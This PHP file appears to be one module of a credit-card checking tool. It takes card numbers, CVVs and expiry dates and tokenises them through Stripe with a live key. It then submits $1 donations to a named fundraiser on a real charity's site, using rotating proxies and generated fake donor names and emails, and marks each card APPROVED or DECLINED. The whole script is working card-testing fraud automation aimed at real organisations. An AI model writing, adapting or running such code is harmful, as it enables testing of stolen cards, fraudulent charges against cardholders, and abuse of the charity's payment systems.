<?php

$retry = 0;

$isRetry = False;

start:

if ($isRetry) {
	$retry++;

	$this->curlx->DeleteCookie();
}

if ($retry > 2) {
	if (empty($empty)) $empty = 'Maximum Retrys Reached';

	$status = ['emoji' => '❌', 'status' => 'DECLINED', 'msg' => "RETRY - $empty!"];

	goto end;
}

$isRetry = True;

$server = $this->proxy();

$fake = $this->tools->GetUser();

$cookie = uniqid();

$data = 'card[name]='.$fake->first.'+'.$fake->last.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F78ef418&time_on_page='.rand(50000, 100000).'&key=pk_live_Lb0eQVyhIwWsXbXD3iEQt0Lr';

$r1 = $this->curlx->Post('https://api.stripe.com/v1/tokens', $data, null, null, $server['proxy']);

if (!$r1->success) goto start;

$json_r1 = json_decode($r1->body);

if (isset($json_r1->error)) {
	$status = $this->response->ErrorHandler($json_r1->error);

	goto end;
}

if (!isset($json_r1->id)) goto start;

$tok = $json_r1->id;
$brand = $json_r1->card->brand;
$country = $json_r1->card->country;

$headers = [
	'authority: www.chain-reaction.org.au',
	'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	'accept-language: en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7',
	'cache-control: max-age=0',
	'sec-ch-ua: "Chromium";v="103", ".Not/A)Brand";v="99"',
	'sec-ch-ua-mobile: ?1',
	'sec-ch-ua-platform: "Android"',
	'sec-fetch-dest: document',
	'sec-fetch-mode: navigate',
	'sec-fetch-site: none',
	'sec-fetch-user: ?1',
	'upgrade-insecure-requests: 1',
	'user-agent: Mozilla/5.0 (Linux; Android 10; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.104 Mobile Safari/537.36',
];

$r2 = $this->curlx->Get('https://www.chain-reaction.org.au/fundraisers/stephencarpenter', $headers, $cookie, $server['proxy']);

if (!$r2->success) goto start;

$CSRFToken = $this->getstr($r2->body, 'CSRFToken" value="', '"');

if (empty($CSRFToken)) {
	$empty = 'Second Request Token is Empty';

	goto start;
}

$data = 'CSRFToken='.$CSRFToken.'&mandatory=d_receipt%2Cd_fname%2Cd_lname%2Cd_email%7Bemail%7D%2Cpayment_method%2Cd_amount&d_amount=1&donation_frequency=&donation_period=&d_amount_sel=&d_fee=0&token='.$tok.'&payment_intent_id=&card_brand='.$brand.'&card_country='.$country.'&initial_amount=1&is_profile_donation=Y&d_photo=&fbuser_id=&fbuser_pic=&event_id=8570&elements_payment_method=card&d_amount_free=1&d_receipt=personal&d_organisation=&d_fname='.$fake->first.'&d_lname='.$fake->last.'&d_email='.urlencode($fake->email).'&d_optin_text=During+the+event%2C+get+daily+updates%2C+photos+and+video+straight+to+your+inbox.+We%27ll+also+be+able+to+send+you+a+copy+of+your+donation+receipt+at+tax+time.&d_optin=N&d_leave_message=N&d_comments=&d_display_name='.$fake->first.'+'.$fake->last.'&payment_method=credit+card&card_name='.$fake->first.'+'.$fake->last.'&card_number='.$cc.'&card_expiry_month='.$mm.'&card_expiry_year='.$yy.'&card_cvv='.$cvv;

$headers = [
	'authority: www.chain-reaction.org.au',
	'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	'accept-language: en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7',
	'cache-control: max-age=0',
	'content-type: application/x-www-form-urlencoded',
	'origin: https://www.chain-reaction.org.au',
	'referer: https://www.chain-reaction.org.au/fundraisers/stephencarpenter',
	'sec-ch-ua: "Chromium";v="103", ".Not/A)Brand";v="99"',
	'sec-ch-ua-mobile: ?1',
	'sec-ch-ua-platform: "Android"',
	'sec-fetch-dest: document',
	'sec-fetch-mode: navigate',
	'sec-fetch-site: same-origin',
	'sec-fetch-user: ?1',
	'upgrade-insecure-requests: 1',
	'user-agent: Mozilla/5.0 (Linux; Android 10; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.104 Mobile Safari/537.36'
];

$r3 = $this->curlx->Post('https://www.chain-reaction.org.au/sponsor/fundraiser/stephencarpenter/2023-sydney', $data, $headers, $cookie, $server['proxy']);

if (!$r3->success) goto start;

if (strpos($r3->body, 'Thank You To My Donors') !== false) {
	$status = ['emoji' => '✅', 'status' => 'APPROVED', 'msg' => "CHARGED - Thank You To My Donors!"];

	goto end;
}

$pp_id = $this->getstr($r3->body, 'https://www.chain-reaction.org.au/sponsor/processpayment/', '"');

if (empty($pp_id)) {
	$empty = 'Third Request Token is Empty';

	goto start;
}

$data = 'CSRFToken='.$CSRFToken.'&CSRFToken='.$CSRFToken.'&mandatory=d_receipt%2Cd_fname%2Cd_lname%2Cd_email%7Bemail%7D%2Cpayment_method%2Cd_amount&d_amount=1&donation_frequency=&donation_period=&d_amount_sel=&d_fee=0&token='.$tok.'&payment_intent_id=&card_brand='.$brand.'&card_country='.$country.'&initial_amount=1&is_profile_donation=Y&d_photo=&fbuser_id=&fbuser_pic=&event_id=8570&elements_payment_method=card&d_amount_free=1&d_receipt=personal&d_organisation=&d_fname='.$fake->first.'&d_lname='.$fake->last.'&d_email='.urlencode($fake->email).'&d_optin_text=During+the+event%2C+get+daily+updates%2C+photos+and+video+straight+to+your+inbox.+We%27ll+also+be+able+to+send+you+a+copy+of+your+donation+receipt+at+tax+time.&d_optin=N&d_leave_message=N&d_comments=&d_display_name='.$fake->first.'+'.$fake->last.'&payment_method=credit+card&card_name='.$fake->first.'+'.$fake->last.'&card_number='.substr($cc, 0, 4).'********'.$last4.'&card_expiry_month='.$mm.'&card_expiry_year='.$yy.'&card_cvv='.$cvv.'&d_optin_fees_rate=2.5';

$headers = [
	'authority: www.chain-reaction.org.au',
	'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	'accept-language: en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7',
	'cache-control: max-age=0',
	'content-type: application/x-www-form-urlencoded',
	'origin: https://www.chain-reaction.org.au',
	'referer: https://www.chain-reaction.org.au/sponsor/fundraiser/stephencarpenter/2023-sydney',
	'sec-ch-ua: "Chromium";v="103", ".Not/A)Brand";v="99"',
	'sec-ch-ua-mobile: ?1',
	'sec-ch-ua-platform: "Android"',
	'sec-fetch-dest: document',
	'sec-fetch-mode: navigate',
	'sec-fetch-site: same-origin',
	'upgrade-insecure-requests: 1',
	'user-agent: Mozilla/5.0 (Linux; Android 10; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.104 Mobile Safari/537.36'
];

$r4 = $this->curlx->Post('https://www.chain-reaction.org.au/sponsor/processpayment/'.$pp_id.'', $data, $headers, $cookie, $server['proxy']);

if (!$r4->success) goto start;

$err = trim(strip_tags($this->getstr($r4->body, 'The following errors were encountered:', '</p>')));

if (empty($err)) file_put_contents('stra_r4_no_err.txt', $r4->body . PHP_EOL, FILE_APPEND);

$status = $this->response->Stripe($r4->body, $err);

end: